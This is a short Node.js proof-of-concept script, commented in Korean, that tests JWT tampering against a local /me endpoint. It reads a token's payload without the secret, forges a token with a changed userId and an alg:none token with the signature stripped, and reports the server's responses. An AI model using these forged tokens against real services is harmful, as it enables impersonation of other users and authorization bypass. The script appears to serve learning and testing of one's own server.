// JWT 변조 PoC — 비밀키 없이 페이로드 열람 + 변조 토큰 2종으로 /me 접근 시도
// 사용법: 아래 TOKEN에 본인 로그인 토큰 넣고 `node jwt_tampering_attack.js`
// ⚠️ 실제 토큰은 커밋 X (placeholder 유지)
const TOKEN = '로그인_토큰';

const decode = (part) => JSON.parse(Buffer.from(part, 'base64url').toString());
const encode = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64url');
const [header, payload, signature] = TOKEN.split('.');

// 1. JWT는 서명만 되고 암호화되지 않음 → 비밀키 없이 누구나 열람 가능
console.log('페이로드 열람:', decode(payload));

// 2. 변조 토큰: 서명을 검증하지 않는 서버라면 통과함
const tokens = {
  '정상 토큰': TOKEN,
  'userId 변조': [header, encode({ ...decode(payload), userId: 1 }), signature].join('.'),
  'alg:none (서명 제거)': [encode({ alg: 'none', typ: 'JWT' }), payload, ''].join('.'),
};

(async () => {
  for (const [name, token] of Object.entries(tokens)) {
    const res = await fetch('http://localhost:3000/me', {
      headers: { Authorization: `Bearer ${token}` },
    });
    console.log(`${name}: ${res.status}`);
  }
})();
